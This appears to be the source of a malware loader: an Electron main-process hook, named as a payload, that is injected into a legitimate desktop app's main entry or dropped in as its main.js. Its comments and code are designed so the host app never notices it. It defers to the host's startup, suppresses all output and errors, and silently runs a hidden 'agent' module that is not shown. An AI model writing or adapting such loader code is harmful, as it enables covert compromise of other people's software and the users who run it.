// entry.js — Electron main-process hook + plain-node entry.
// Run modes:
//   1. plain node (dev/test):           node dist/lois.payload.js
//   2. script-jacked into an Electron   injector appends one guarded require()
//      app (main.js hook):             line to the host's main entry — we live
//                                       exactly as long as the host app
//   3. dropped in AS the app's main.js: same passive mode
//
// Injected-mode contract (the host app must never notice us):
//   - a throw at load time must NEVER break the host: everything is guarded
//   - no console output unless debug (sidecar "debug": true / LOIS_DEBUG=1)
//   - no global handlers, no lifecycle hooks, no window/dock mutations
let _electron = null;
try { _electron = require('electron'); } catch (_) { /* plain node */ }

function startMain() {
  try {
    const { run } = require('./agent');
    const p = run();
    if (p && typeof p.catch === 'function') p.catch(() => {}); // never surface
  } catch (_) { /* fail silent */ }
}

if (!_electron || !_electron.app) {
  startMain(); // plain node: runs now, exits when the event loop drains
} else {
  const app = _electron.app;
  // defer until the host's main process is ready so we never race its startup;
  // passive only — no app event handlers registered, host keeps its lifecycle
  try {
    if (app.isReady && !app.isReady()) app.whenReady().then(startMain, () => {});
    else startMain();
  } catch (_) { startMain(); }
}
